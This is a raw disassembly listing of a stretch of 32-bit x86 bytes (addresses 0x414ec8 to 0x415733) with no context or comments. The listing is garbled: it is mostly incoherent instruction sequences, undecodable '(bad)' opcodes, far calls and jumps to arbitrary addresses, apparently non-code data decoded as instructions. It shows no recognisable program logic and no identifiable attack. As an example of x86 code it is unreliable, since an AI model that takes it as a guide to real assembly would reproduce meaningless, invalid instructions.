  414ec8:	adc    al,0x4d
  414eca:	outs   dx,BYTE PTR ds:[esi]
  414ecb:	mov    al,bl
  414ecd:	dec    esp
  414ece:	add    BYTE PTR [eax],al
  414ed0:	retf   0x6961
  414ed3:	gs jecxz 0x414ed6
  414ed6:	pop    ebp
  414ed7:	jae    0x414e85
  414ed9:	push   esi
  414eda:	pop    ebp
  414edb:	jae    0x414e99
  414edd:	push   esi
  414ede:	add    BYTE PTR [esi-0x17],dh
  414ee1:	pusha  
  414ee2:	je     0x414f53
  414ee4:	loop   0x414f40
  414ee6:	add    BYTE PTR [edi+esi*8+0x4d],ch
  414eea:	outs   dx,DWORD PTR fs:[esi]
  414eec:	jbe    0x414ef2
  414eee:	sub    eax,0x73753332
  414ef3:	adc    BYTE PTR gs:0x32233332,dh
  414efa:	sub    eax,0x5d685300
  414eff:	jb     0x414f2d
  414f01:	outs   dx,BYTE PTR ds:[esi]
  414f02:	popa   
  414f03:	imul   edx,DWORD PTR [eax],0x63
  414f06:	popa   
  414f07:	outs   dx,DWORD PTR ds:[esi]
  414f08:	and    ah,BYTE PTR [ebx+0x61]
  414f0b:	add    BYTE PTR [edi+0x4d],cl
  414f0e:	outs   dx,BYTE PTR ds:[esi]
  414f0f:	outs   dx,BYTE PTR ds:[esi]
  414f10:	cmp    eax,0x316d006e
  414f15:	arpl   WORD PTR [ebx+0x69],sp
  414f18:	sub    eax,0x39727404
  414f1d:	dec    edx
  414f1e:	gs je  0x414efa
  414f21:	jmp    FWORD PTR [edx+0x6e]
  414f24:	hlt    
  414f25:	dec    esp
  414f26:	outs   dx,BYTE PTR ds:[esi]
  414f27:	add    BYTE PTR gs:[eax],al
	...
  414f3a:	add    BYTE PTR [eax],al
  414f3c:	shl    BYTE PTR [edx+esi*1],1
  414f3f:	xor    eax,DWORD PTR [ecx-0x7cffa09f]
  414f45:	inc    edi
  414f46:	arpl   WORD PTR gs:[ebx+0x7a006e58],cx
  414f4d:	push   0x71d7696e
  414f52:	add    BYTE PTR [ebx-0x58],ah
  414f55:	jno    0x414fbc
  414f57:	jae    0x414ee9
  414f59:	outs   dx,DWORD PTR ds:[esi]
  414f5a:	pop    ebp
  414f5b:	jae    0x414f96
  414f5d:	xchg   BYTE PTR [esi+0x30],dh
  414f60:	jmp    0x414ee6
  414f62:	add    DWORD PTR [edi-0x1c],ebx
  414f65:	gs jne 0x414fcf
  414f68:	xlat   BYTE PTR ds:[ebx]
  414f69:	fdiv   DWORD PTR [edx+0x70]
  414f6c:	fsub   DWORD PTR [esi+0x5a]
  414f6f:	ja     0x414faa
  414f71:	js     0x414fd8
  414f73:	imul   esp,eax,0x52
  414f76:	add    al,0x6b
  414f78:	fadd   QWORD PTR [esi+0x60]
  414f7b:	addr16 iret 
  414f7d:	fsub   DWORD PTR [esi+0x6d]
  414f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f81:	inc    edx
  414f82:	pusha  
  414f83:	arpl   WORD PTR [ecx],di
  414f85:	cmp    esi,DWORD PTR [edx+0x67]
  414f88:	pushf  
  414f89:	cmp    ebp,DWORD PTR [eax+0x71]
  414f8c:	cmp    DWORD PTR [ecx+0x5d],eax
  414f8f:	jo     0x414f2d
  414f91:	fnstenv [edx+0x68]
  414f94:	cwde   
  414f95:	adc    eax,0xfb396b5d
  414f9a:	pop    edx
  414f9b:	outs   dx,BYTE PTR ds:[esi]
  414f9c:	test   esp,edi
  414f9e:	pop    ebp
  414f9f:	add    BYTE PTR fs:[eax],al
	...
  414fb2:	add    BYTE PTR [eax],al
  414fb4:	data16 fstp DWORD PTR [ebp+0x6d]
  414fb8:	pop    esi
  414fb9:	push   cs
  414fba:	pop    ebx
  414fbb:	outs   dx,BYTE PTR ds:[esi]
  414fbc:	pop    esi
  414fbd:	fstp   DWORD PTR [ecx+0x5f]
  414fc0:	imul   eax,DWORD PTR ds:0xe6397767,0x60
  414fc7:	ins    DWORD PTR es:[edi],dx
  414fc8:	bound  edi,QWORD PTR [esp+ebp*2+0x35120e00]
  414fcf:	xor    eax,0x715ebf39
  414fd4:	sbb    al,0xc9
  414fd6:	pop    ecx
  414fd7:	add    BYTE PTR ds:0x206962ac,bl
  414fdd:	fldenv [ebp+0x67]
  414fe0:	push   ss
  414fe1:	shl    BYTE PTR [ebp+0x5f],0x25
  414fe5:	fldenv [eax+eax*1+0x5]
  414fe9:	add    BYTE PTR [edi-0x7b9be888],cl
  414fef:	jno    0x41502a
  414ff1:	outs   dx,DWORD PTR ds:[esi]
  414ff2:	xchg   edi,eax
  414ff3:	pop    esp
  414ff4:	jmp    0x41504e
  414ff6:	xchg   ebx,eax
  414ff7:	add    ebx,ebx
  414ff9:	pusha  
  414ffa:	xchg   ebp,eax
  414ffb:	fidiv  WORD PTR [bp+di-0x19]
  414fff:	push   0x718c73cf
  415004:	cmp    DWORD PTR [ecx+0x7d],esp
  415007:	ja     0x414fea
  415009:	pop    edx
  41500a:	push   ebp
  41500b:	imul   edi,DWORD PTR [ecx],0x5f
  41500e:	dec    esi
  41500f:	jb     0x414fd8
  415011:	fs pop ebx
  415013:	js     0x414faf
  415015:	add    BYTE PTR [edi],bh
  415017:	pop    ebp
	...
  41502c:	cwde   
  41502d:	push   ebp
  41502e:	dec    esp
  41502f:	imul   edi,DWORD PTR [ecx],0x70
  415032:	dec    esi
  415033:	jne    0x414fcf
  415035:	outs   dx,BYTE PTR ds:[esi]
  415036:	out    0x61,eax
  415038:	call   0x1557:0xa263415a
  41503f:	add    al,0x9e
  415041:	pop    esp
  415042:	push   cs
  415043:	jbe    0x414fdf
  415045:	addr16 push es
  415047:	ja     0x41509f
  415049:	add    al,bl
  41504b:	jb     0x415078
  41504d:	jno    0x415009
  41504f:	cmp    WORD PTR [edx+0x10],si
  415053:	je     0x4150af
  415055:	outs   dx,BYTE PTR ds:[esi]
  415056:	out    0x64,eax
  415058:	pop    edx
  415059:	pop    edx
  41505a:	add    al,0x71
  41505c:	push   esi
  41505d:	ins    DWORD PTR es:[edi],dx
  41505e:	out    0x58,eax
  415060:	push   edi
  415061:	push   edi
  415062:	(bad)  
  415063:	pop    ebx
  415064:	inc    ebp
  415065:	add    al,bl
  415067:	je     0x415083
  415069:	outs   dx,BYTE PTR ds:[esi]
  41506a:	shr    DWORD PTR [edx+0x5e],cl
  41506d:	add    dl,cl
  41506f:	jno    0x41508b
  415071:	pop    edi
  415072:	mov    bl,0x5a
  415074:	daa    
  415075:	arpl   WORD PTR [eax],ax
  415077:	jmp    0xcbaeab98
  41507c:	sbb    ebp,DWORD PTR [esi+0x0]
  41507f:	mov    BYTE PTR [esi],bl
  415081:	popa   
  415082:	mov    BYTE PTR fs:[ecx],cl
  415085:	add    BYTE PTR [edx-0x7a],dh
  415088:	out    dx,al
  415089:	pusha  
  41508a:	imul   eax,DWORD PTR [eax-0x779390c6],0x0
	...
  4150a1:	add    BYTE PTR [eax],al
  4150a3:	add    bl,dl
  4150a5:	pop    esp
  4150a6:	jb     0x415091
  4150a8:	in     eax,0x60
  4150aa:	jno    0x415039
  4150ac:	cmc    
  4150ad:	push   esp
  4150ae:	add    BYTE PTR [ecx-0x38],bh
  4150b1:	dec    eax
  4150b2:	addr16 pop edx
  4150b4:	fdivp  st(7),st
  4150b6:	jns    0x415119
  4150b8:	fdiv   DWORD PTR [ecx+0x62]
  4150bb:	inc    edi
  4150bc:	xchg   esi,eax
  4150bd:	add    BYTE PTR [ecx+0x48],dh
  4150c0:	mov    gs,WORD PTR [ebp+0x63]
  4150c3:	push   ebp
  4150c4:	cmp    eax,0x96526755
  4150c9:	add    BYTE PTR [eax+ecx*2-0x67],ah
  4150cd:	pop    esp
  4150ce:	pop    edi
  4150cf:	cmp    dh,BYTE PTR ds:0x9e0c7263
  4150d5:	pop    edx
  4150d6:	add    BYTE PTR ds:0x1d746f96,dl
  4150dc:	pop    esi
  4150dd:	outs   dx,DWORD PTR ds:[esi]
  4150de:	je     0x4150c9
  4150e0:	(bad)
  4150e4:	imul   esp,DWORD PTR [ecx+0x61],0x12
  4150e8:	xor    eax,0x590c6e5b
  4150ed:	pop    ebx
  4150ee:	jbe    0x4150f4
  4150f0:	xor    eax,0x63df5f64
  4150f5:	fs add ah,cl
  4150f8:	push   ebx
  4150f9:	pop    esp
  4150fa:	ins    DWORD PTR es:[edi],dx
  4150fb:	fistp  WORD PTR [edi]
  4150fd:	add    BYTE PTR [ecx-0x3f],ah
  415100:	daa    
  415101:	outs   dx,BYTE PTR ds:[esi]
  415102:	popa   
  415103:	add    BYTE PTR [eax+0x7265fc],cl
	...
  415119:	add    BYTE PTR [eax],al
  41511b:	add    BYTE PTR [ecx-0x5f9b919f],cl
  415121:	arpl   WORD PTR [ebx+0x64],bp
  415124:	mov    al,ds:0xa4736160
  415129:	inc    ebp
  41512a:	outs   dx,BYTE PTR ds:[esi]
  41512b:	jns    0x4150bd
  41512d:	dec    edx
  41512e:	imul   ebp,DWORD PTR [esi-0x3b],0xfffffffc
  415132:	push   0x6b6ec369
  415137:	jae    0x415108
  415139:	bound  esi,QWORD PTR [eax+eax*1-0x5e]
  41513d:	xor    dh,BYTE PTR cs:[edx]
  415140:	xchg   edx,eax
  415141:	add    BYTE PTR cs:[edx-0x3b],ah
  415145:	pop    esi
  415146:	bound  ebp,QWORD PTR [ebp+esi*8+0x70]
  41514a:	add    BYTE PTR [ecx],dh
  41514c:	and    DWORD PTR [ebx],esi
  41514e:	sub    eax,0x2d2d5131
  415153:	add    BYTE PTR [ebx+0x73615f4b],al
  415159:	dec    ebx
  41515a:	ins    BYTE PTR es:[edi],dx
  41515b:	popa   
  41515c:	adc    BYTE PTR [esi+0x6b],al
  41515f:	jb     0x4150e5
  415161:	pop    ebp
  415162:	outs   dx,BYTE PTR ds:[esi]
  415163:	xor    dl,BYTE PTR [ebx]
  415165:	add    al,0x65
  415167:	ins    BYTE PTR es:[edi],dx
  415168:	das    
  415169:	jb     0x4151cc
  41516b:	addr16 das 
  41516d:	pusha  
  41516e:	add    BYTE PTR [esi+0x3f],ah
  415171:	dec    ebx
  415172:	je     0x4151d6
  415174:	inc    ecx
  415175:	dec    eax
  415176:	ins    BYTE PTR es:[edi],dx
  415177:	xor    eax,edx
  415179:	dec    edi
  41517a:	imul   esi,DWORD PTR [esi+0x49],0x4a
  41517e:	arpl   WORD PTR [eax],ax
	...
  415194:	ds pop ebp
  415196:	je     0x415200
  415198:	inc    ecx
  415199:	dec    edx
  41519a:	add    BYTE PTR [ebp-0x13],ah
  41519d:	dec    eax
  41519e:	pop    ebp
  41519f:	outs   dx,BYTE PTR ds:[esi]
  4151a0:	in     eax,0x60
  4151a2:	ins    BYTE PTR es:[edi],dx
  4151a3:	add    BYTE PTR [ecx],bh
  4151a5:	retf   0x6d66
  4151a8:	push   ds
  4151a9:	mov    ebx,0xa41f006c
  4151ae:	imul   cx,WORD PTR [esi],0x5fbf
  4151b3:	add    BYTE PTR [edx],cl
  4151b5:	mov    eax,0xd9106b58
  4151ba:	pop    eax
  4151bb:	pop    edi
  4151bc:	add    DWORD PTR [esi-0x26f293a0],eax
  4151c2:	pop    ebx
  4151c3:	pop    edi
  4151c4:	jmp    0x5965:0xe300577d
  4151cb:	outs   dx,BYTE PTR ds:[esi]
  4151cc:	cmp    DWORD PTR [eax-0x5619cd8c],ebp
  4151d2:	pusha  
  4151d3:	xor    al,0xcb
  4151d5:	fsub   DWORD PTR [ebx+0x5f]
  4151d8:	fld    TBYTE PTR [edi+0x1]
  4151db:	jb     0x4151b9
  4151dd:	xor    al,0x33
  4151df:	xor    cl,BYTE PTR [edx]
  4151e1:	fldenv [ebx+0x6c]
  4151e4:	cwde   
  4151e5:	cmp    ebx,DWORD PTR [eax+0x5f]
  4151e8:	cmp    DWORD PTR [ecx+0x76],ecx
  4151eb:	addr16 xchg edi,eax
  4151ed:	cmp    bl,BYTE PTR [edi+0x0]
  4151f0:	test   al,0x2e
  4151f2:	pop    edi
  4151f3:	jb     0x415182
  4151f5:	fldenv [esi+0x68]
	...
  41520c:	xchg   esp,eax
  41520d:	and    eax,0xd9986375
  415212:	xor    BYTE PTR [ebx],dh
  415214:	inc    esp
  415215:	int3   
  415216:	xor    BYTE PTR [eax],al
  415218:	pop    eax
  415219:	jmp    DWORD PTR [eax+0x63]
  41521c:	pop    ebp
  41521d:	enter  0x6801,0x58
  415221:	jmp    0x415280
  415223:	popa   
  415224:	dec    esi
  415225:	jmp    0x415287
  415227:	add    BYTE PTR [ebp-0xc],bl
  41522a:	imul   esi,DWORD PTR [esp+edx*2-0x15],0x1
  41522f:	jno    0x415289
  415231:	add    ch,bl
  415233:	pusha  
  415234:	push   ebp
  415235:	add    BYTE PTR [eax],bl
  415237:	xor    eax,0x371a326b
  41523c:	cmp    DWORD PTR [eax-0x38],ebx
  41523f:	push   edi
  415240:	adc    eax,0xfe5de757
  415245:	jb     0x4151fe
  415247:	pusha  
  415248:	or     eax,DWORD PTR [eax]
  41524a:	retf   
  41524b:	fs pop ds
  41524d:	pop    ecx
  41524e:	les    edx,FWORD PTR [edi+0x15]
  415251:	pop    ebp
  415252:	out    0x5e,eax
  415254:	push   ss
  415255:	ins    BYTE PTR es:[edi],dx
  415256:	xchg   ebx,eax
  415257:	pusha  
  415258:	out    0xff,eax
  41525a:	mov    DWORD PTR [eax+ebp*8+0x72],esp
  41525e:	and    BYTE PTR [eax+0x39],0x73
  415262:	jnp    0x4152c4
  415264:	int    0x53
  415266:	mov    BYTE PTR [ebx],al
  415268:	leave  
  415269:	jno    0x4151f3
  41526b:	ins    BYTE PTR es:[edi],dx
  41526c:	fidiv  DWORD PTR [ecx-0x19]
  41526f:	pop    ebx
	...
  415284:	aam    0x6b
  415286:	dec    ebx
  415287:	pop    ecx
  415288:	aam    0xff
  41528a:	push   ebp
  41528b:	pop    ebx
  41528c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41528d:	pop    esp
  41528e:	inc    esi
  41528f:	jno    0x415239
  415291:	add    BYTE PTR [edi+ebp*2],bh
  415294:	test   al,0x6c
  415296:	dec    ebx
  415297:	pop    ebx
  415298:	call   0x3a5b:0x8d634600
  41529f:	add    al,0x9b
  4152a1:	push   edi
  4152a2:	cmp    ebx,DWORD PTR [eax-0x64]
  4152a5:	pop    edi
  4152a6:	sbb    ebx,DWORD PTR [edi-0x78]
  4152a9:	add    BYTE PTR [esi],al
  4152ab:	pop    esp
  4152ac:	pop    ebx
  4152ad:	pop    esp
  4152ae:	sbb    ebx,DWORD PTR [edx+0x39]
  4152b1:	pop    ebp
  4152b2:	add    eax,0x1459535c
  4152b7:	add    al,0xe
  4152b9:	xor    bh,BYTE PTR [edx+0x2e0a2f]
  4152bf:	mov    esi,0xe9302d22
  4152c4:	cmp    ah,BYTE PTR [ecx+0x74]
  4152c7:	loop   0x41530d
  4152c9:	outs   dx,BYTE PTR ds:[esi]
  4152ca:	imul   ecx,esi,0xdc75562c
  4152d0:	cmp    bl,BYTE PTR [eax+0x74]
  4152d3:	aad    0x2a
  4152d5:	sub    ch,BYTE PTR ds:0x756b2816
  4152db:	bndldx bnd2,[edx+eiz*2-0x34]
  4152e0:	add    al,0x5b
  4152e2:	push   0x6d5f20c0
  4152e7:	xchg   esp,eax
	...
  4152fc:	dec    esp
  4152fd:	sub    BYTE PTR [eax],dh
  4152ff:	loope  0x41532b
  415301:	adc    esi,DWORD PTR [eax-0x7a]
  415304:	adc    BYTE PTR [ebp+0x2d],ch
  415307:	xchg   bl,bl
  415309:	imul   esp,DWORD PTR [ebx-0x29],0xffffffea
  41530d:	push   edi
  41530e:	jo     0x4152f9
  415310:	repnz imul esi,DWORD PTR [ecx+edi*2+0x1c],0x13
  415316:	sub    eax,0x5f6cd78b
  41531b:	push   edi
  41531c:	fldcw  WORD PTR [esi+0x6b]
  41531f:	push   eax
  415320:	xchg   ecx,eax
  415321:	popa   
  415322:	cs dec eax
  415324:	test   eax,0x814a6b53
  415329:	pop    ebp
  41532a:	popa   
  41532b:	push   edx
  41532c:	inc    ebx
  41532d:	pop    edi
  41532e:	ins    DWORD PTR es:[edi],dx
  41532f:	add    esp,DWORD PTR [ebp+0x30]
  415332:	cmp    cl,bh
  415334:	xor    DWORD PTR [eax+0x6d],esi
  415337:	aas    
  415338:	xchg   edx,eax
  415339:	adc    esp,DWORD PTR [ebp+0x8]
  41533c:	mov    DWORD PTR [ecx+0x2e],esp
  41533f:	sbb    DWORD PTR [ebp-0x6d16ff90],edx
  415345:	ins    BYTE PTR es:[edi],dx
  415346:	je     0x415361
  415348:	pop    ss
  415349:	adc    ebp,DWORD PTR ds:0x6546dd00
  41534f:	jbe    0x41538e
  415351:	outs   dx,BYTE PTR ds:[esi]
  415352:	pop    edi
  415353:	imul   ecx,esp,0x86747659
  415359:	popa   
  41535a:	ins    BYTE PTR es:[edi],dx
  41535b:	je     0x41534a
  41535d:	push   0x76
  41535f:	imul   eax,DWORD PTR [eax],0x0
	...
  415371:	add    BYTE PTR [eax],al
  415373:	add    BYTE PTR [ebx+0x772e5d54],dl
  415379:	push   0x63
  41537b:	das    
  41537c:	inc    ecx
  41537d:	pop    esi
  41537e:	jae    0x4153ce
  415380:	js     0x4153ad
  415382:	cs gs js 0x4153cb
  415386:	add    BYTE PTR [eax-0x34],ch
  415389:	push   esp
  41538a:	jo     0x4153c6
  41538c:	xchg   DWORD PTR [edi],eax
  41538e:	data16 je 0x415331
  415391:	push   es
  415392:	popa   
  415393:	(bad)  
  415394:	int    0x6a
  415396:	outs   dx,BYTE PTR ds:[esi]
  415397:	gs mov ebp,0xa6656e46
  41539d:	pop    ebx
  41539e:	imul   ebp,DWORD PTR [ebp-0x79],0x2f
  4153a2:	jp     0x4153e6
  4153a4:	cdq    
  4153a5:	das    
  4153a6:	js     0x4153fb
  4153a8:	jbe    0x4153ef
  4153aa:	js     0x415411
  4153ac:	push   eax
  4153ad:	dec    eax
  4153ae:	je     0x415424
  4153b0:	loopne 0x4153cb
  4153b2:	sub    ebp,DWORD PTR [edi]
  4153b4:	(bad)  
  4153b5:	push   ebx
  4153b6:	jae    0x4153e6
  4153b8:	or     DWORD PTR [ebx+0x72],0x62
  4153bc:	jno    0x415408
  4153be:	pop    edi
  4153bf:	imul   ebp,DWORD PTR [edi+0x5d],0x5f467372
  4153c6:	imul   ebp,DWORD PTR [ebp+0x37],0x2d
  4153ca:	xor    al,0x39
  4153cc:	and    BYTE PTR [eax+0x32],dh
  4153cf:	jne    0x4153fa
  4153d1:	or     ah,BYTE PTR [ecx+0x78]
  4153d4:	cmp    eax,0x7467fc
	...
  4153e9:	add    BYTE PTR [eax],al
  4153eb:	add    BYTE PTR [ecx],bh
  4153ed:	add    eax,0xa2163a74
  4153f2:	outs   dx,BYTE PTR fs:[esi]
  4153f4:	addr16 hlt 
  4153f6:	push   edi
  4153f7:	ins    DWORD PTR es:[edi],dx
  4153f8:	dec    ecx
  4153f9:	cld    
  4153fa:	adc    eax,0x49ba5e72
  4153ff:	push   ebp
  415400:	pop    eax
  415401:	mov    ds:0xd9547860,eax
  415406:	add    DWORD PTR [edi+0xc],edx
  415409:	mov    al,0x51
  41540b:	push   ebp
  41540c:	cmc    
  41540d:	xchg   edx,eax
  41540e:	cmp    al,0x4c
  415410:	cld    
  415411:	or     BYTE PTR [ebx+0x53],cl
  415414:	lock mov BYTE PTR [edx],bh
  415417:	inc    esp
  415418:	jmp    FWORD PTR [edi-0x6fb6bccb]
  41541e:	push   eax
  41541f:	inc    edi
  415420:	cli    
  415421:	xchg   BYTE PTR [eax+edx*2-0x1b],cl
  415425:	xchg   ebx,eax
  415426:	cmp    eax,0x3cac1030
  41542b:	das    
  41542c:	pop    ds
  41542d:	leave  
  41542e:	add    DWORD PTR [eax],eax
  415430:	cmp    ecx,ebx
  415432:	add    DWORD PTR [edx],eax
  415434:	cmp    DWORD PTR [esi+esi*1+0x4d7ec44],ebp
  41543b:	add    BYTE PTR [ecx],bh
  41543d:	fld    DWORD PTR [ecx]
  41543f:	add    BYTE PTR [ecx],bh
  415441:	fld    DWORD PTR [ecx]
  415443:	push   ecx
  415444:	out    dx,al
  415445:	adc    dl,BYTE PTR [eax+0x55]
  415448:	js     0x415471
  41544a:	aas    
  41544b:	pop    esp
  41544c:	jl     0x41548e
  41544e:	popa   
  41544f:	jb     0x415451
	...
  415461:	add    BYTE PTR [eax],al
  415463:	add    BYTE PTR [esi-0x5a99aaba],dl
  415469:	sbb    eax,0x3da7674d
  41546e:	push   ebp
  41546f:	jne    0x4153fb
  415471:	or     eax,0x278b7341
  415476:	pop    edi
  415477:	outs   dx,BYTE PTR ds:[esi]
  415478:	test   DWORD PTR [eax],eax
  41547a:	cmp    eax,0x106f6b61
  41547f:	push   edi
  415480:	pop    edi
  415481:	inc    esp
  415482:	cmp    al,0x56
  415484:	pop    esi
  415485:	push   edx
  415486:	sbb    dh,BYTE PTR [eax+0x7e]
  415489:	push   esp
  41548a:	adc    eax,DWORD PTR [edx+ebp*2]
  41548d:	push   edx
  41548e:	adc    BYTE PTR [esi+0x48],dl
  415491:	ins    BYTE PTR es:[edi],dx
  415492:	or     BYTE PTR [eax+0x55],bl
  415495:	dec    edi
  415496:	repz jno 0x4154ef
  415499:	push   edx
  41549a:	into   
  41549b:	add    edi,ebp
  41549d:	pop    eax
  41549e:	fidiv  DWORD PTR [ebx+0x1d]
  4154a1:	popa   
  4154a2:	shl    BYTE PTR ds:0x3c45506,1
  4154a8:	std    
  4154a9:	jmp    esi
  4154ab:	add    edi,DWORD PTR [ecx]
  4154ad:	add    bh,ah
  4154af:	add    edi,DWORD PTR [ecx]
  4154b1:	add    dl,al
  4154b3:	pusha  
  4154b4:	or     edx,DWORD PTR [edx-0x3c]
  4154b7:	push   edi
  4154b8:	dec    eax
  4154b9:	cs aad 0x5f
  4154bc:	in     eax,0x53
  4154be:	out    0x4e,eax
  4154c0:	add    eax,0xed60ae4f
  4154c5:	inc    eax
  4154c6:	mov    ch,BYTE PTR [edi+0x0]
	...
  4154d9:	add    BYTE PTR [eax],al
  4154db:	add    dh,dl
  4154dd:	imul   ecx,DWORD PTR [edx+eax*2+0x567a51e4],0x609a5cdd
  4154e8:	enter  0x806e,0x56
  4154ec:	iret   
  4154ed:	cmp    BYTE PTR [ebx+0x4],cl
  4154f0:	mov    DWORD PTR [esi+0x4e],ebp
  4154f3:	popa   
  4154f4:	call   0x3e4c:0x9d3b5a6d
  4154fb:	push   ecx
  4154fc:	call   0x3052:0xa45b3a6d
  415503:	pusha  
  415504:	cmp    DWORD PTR [eax],eax
  415506:	add    cl,ch
  415508:	cmp    al,BYTE PTR [eax]
  41550a:	add    cl,ch
  41550c:	cmp    al,BYTE PTR [eax]
  41550e:	add    BYTE PTR [edx],cl
  415510:	imul   ebp,DWORD PTR [ecx+0x70],0x15
  415514:	sub    BYTE PTR [esi],ch
  415516:	cs or  eax,0x2a005481
  41551c:	imul   ebp,DWORD PTR [ecx+0x70],0xfffffffd
  415520:	xchg   DWORD PTR [edx+0x70],edx
  415523:	sti    
  415524:	gs ins BYTE PTR es:[edi],dx
  415526:	arpl   WORD PTR [edx],cx
  415528:	dec    ecx
  415529:	cmp    al,0x5f
  41552b:	cmc    
  41552c:	pop    ebx
  41552d:	add    BYTE PTR [eax],al
  41552f:	jmp    0xc46f556e
  415534:	and    bl,BYTE PTR [ebp+0x0]
  415537:	mov    edx,0xd6745a0d
  41553c:	sbb    ebp,DWORD PTR [esi+0x63]
  41553f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  415554:	add    eax,0xfb9b6e59
  415559:	dec    ebp
  41555a:	add    dh,al
  41555c:	or     bl,BYTE PTR [ebp+0x6e]
  41555f:	jmp    0x6941559f
  415564:	call   0x6ceb8c0
  415569:	das    
  41556a:	xor    al,bh
  41556c:	push   es
  41556d:	push   esp
  41556e:	ins    BYTE PTR es:[edi],dx
  41556f:	jmp    0x8c868d7d
  415574:	out    0x39,al
  415576:	ins    DWORD PTR es:[edi],dx
  415577:	(bad)  
  415578:	out    dx,al
  415579:	pop    esp
  41557a:	jb     0x415515
  41557c:	fld    TBYTE PTR [ebx+0x68]
  41557f:	test   al,0x3a
  415581:	add    BYTE PTR [eax],al
  415583:	jmp    0x111255c2
  415588:	jp     0x41558a
  41558a:	call   0xf841cf8f
  41558f:	add    BYTE PTR [edx+0x0],bh
  415592:	push   cs
  415593:	add    BYTE PTR [edx],ch
  415595:	cmp    eax,0x3d2a1c00
  41559a:	add    BYTE PTR [edx+edi*1],ch
  41559d:	cmp    eax,0x3d3a3c00
  4155a2:	add    BYTE PTR [ecx+0xa],dl
  4155a5:	add    BYTE PTR ds:[eax+0xa],ch
  4155a9:	add    BYTE PTR ds:[edx+edi*8+0x3d],bh
  4155ae:	add    BYTE PTR [ebp-0x46ffc206],dl
  4155b4:	jmp    0x0:0xd6003d
	...
  4155cb:	add    dl,ch
  4155cd:	cmp    eax,0xfcd00000
  4155d2:	inc    DWORD PTR [eax]
  4155d4:	sar    ah,1
  4155d6:	jg     0x4155dd
  4155d8:	mov    al,ds:0x994cfffc
  4155dd:	sbb    al,0x44
  4155df:	outs   dx,DWORD PTR ds:[esi]
  4155e0:	jae    0x415633
  4155e2:	imul   esp,DWORD PTR [ebp-0x22],0xa1006f50
  4155e9:	cld    
  4155ea:	(bad)  
  4155eb:	jg     0x415587
  4155ed:	cld    
  4155ee:	(bad)  
  4155ef:	call   ecx
  4155f1:	ins    BYTE PTR es:[edi],dx
  4155f2:	jo     0x415638
  4155f4:	jno    0x415646
  4155f6:	pop    ebp
  4155f7:	add    BYTE PTR [ecx-0x4],ah
  4155fa:	(bad)  
  4155fb:	jg     0x415669
  4155fd:	cld    
  4155fe:	(bad)  
  4155ff:	call   FWORD PTR [ebx+ecx*2+0x1cdc615f]
  415606:	cmp    eax,0x5d20d070
  41560b:	je     0x4155ce
  41560d:	cld    
  41560e:	cld    
  41560f:	call   DWORD PTR [eax+0x7c]
  415612:	and    BYTE PTR [eax],al
  415614:	push   eax
  415615:	cld    
  415616:	ds popa 
  415618:	sub    DWORD PTR [ecx+eiz*2+0x0],0x21
  41561d:	add    al,0x0
  41561f:	cmp    BYTE PTR [ecx],0x8
  415622:	add    al,0x0
  415624:	cmp    DWORD PTR [edx],ebp
  415626:	jno    0x415695
  415628:	mov    ds:0x39716730,al
  41562d:	call   0x415633
	...
  415642:	add    BYTE PTR [eax],al
  415644:	mov    ecx,0x3900040b
  415649:	and    DWORD PTR [ebx+0x71],ebp
  41564c:	ins    DWORD PTR es:[edi],dx
  41564d:	not    BYTE PTR [ebp+0x77]
  415650:	cmp    ebx,ebp
  415652:	add    DWORD PTR [eax],eax
  415654:	mov    ecx,0x390001ec
  415659:	cld    
  41565a:	pop    edx
  41565b:	and    BYTE PTR [ebp-0xa],bh
  41565e:	fs jae 0x4156bd
  415661:	add    al,0x72
  415663:	je     0x4156af
  415665:	jmp    0x697a566d
  41566a:	and    eax,0x46e93900
  41566f:	ins    DWORD PTR es:[edi],dx
  415670:	sbb    al,0xcc
  415672:	jb     0x4156e2
  415674:	pop    ecx
  415675:	test   al,0x51
  415677:	jo     0x41566e
  415679:	(bad)  
  41567a:	push   ebp
  41567b:	pop    edi
  41567c:	cmp    eax,ebp
  41567e:	add    DWORD PTR [eax],eax
  415680:	mov    ecx,0x39000406
  415685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415686:	pop    esp
  415687:	and    cl,ch
  415689:	mov    edi,0x7aec7466
  41568e:	push   0x1eb3971
  415693:	add    BYTE PTR [ecx+0x390001c7],bh
  415699:	stos   BYTE PTR es:[edi],al
  41569a:	jb     0x415707
  41569c:	in     al,0x75
  41569e:	outs   dx,DWORD PTR ds:[esi]
  41569f:	and    ch,dh
  4156a1:	lea    esp,[esi+0x73]
  4156a4:	aam    0x8b
  4156a6:	outs   dx,DWORD PTR ds:[esi]
  4156a7:	je     0x4156a9
	...
  4156b9:	add    BYTE PTR [eax],al
  4156bb:	add    dl,cl
  4156bd:	call   0x7a56c5
  4156c2:	xor    bh,BYTE PTR [bx+di]
  4156c5:	add    bh,ah
  4156c7:	inc    esi
  4156c8:	xchg   esp,eax
  4156c9:	ins    DWORD PTR es:[edi],dx
  4156ca:	inc    esp
  4156cb:	jae    0x41565c
  4156cd:	and    BYTE PTR [eax],ch
  4156cf:	push   0x6d5569a2
  4156d4:	mov    BYTE PTR [ecx+edi*1+0x65],dl
  4156d8:	lea    ebp,[ecx+0x3d]
  4156db:	imul   ebx,DWORD PTR [ecx+0x34],0x5365733e
  4156e2:	out    0x4,eax
  4156e4:	cmp    DWORD PTR [eax],eax
  4156e6:	adc    edi,DWORD PTR [bx+di]
  4156e9:	add    bh,ah
  4156eb:	inc    esp
  4156ec:	push   ebp
  4156ed:	ins    DWORD PTR es:[edi],dx
  4156ee:	add    BYTE PTR [edx+0x5e],dh
  4156f1:	push   ebx
  4156f2:	sti    
  4156f3:	push   ebp
  4156f4:	outs   dx,BYTE PTR ds:[esi]
  4156f5:	push   esp
  4156f6:	adc    BYTE PTR [edx+0x5a],bl
  4156f9:	and    BYTE PTR [ebx],bl
  4156fb:	jae    0x415749
  4156fd:	ins    BYTE PTR es:[edi],dx
  4156fe:	cli    
  4156ff:	add    esi,DWORD PTR [esi+0x3a83e7de]
  415705:	add    bh,ah
  415707:	add    ecx,DWORD PTR [ecx]
  415709:	fst    DWORD PTR gs:[esi+0xc]
  41570d:	outs   dx,BYTE PTR ds:[esi]
  41570e:	enter  0x396f,0x33
  415712:	(bad)  
  415713:	imul   eax,DWORD PTR ds:0x1a55c857,0x186ca43c
  41571d:	push   edx
  41571e:	mov    esi,0x56
	...
  415733:	add    ah,ah
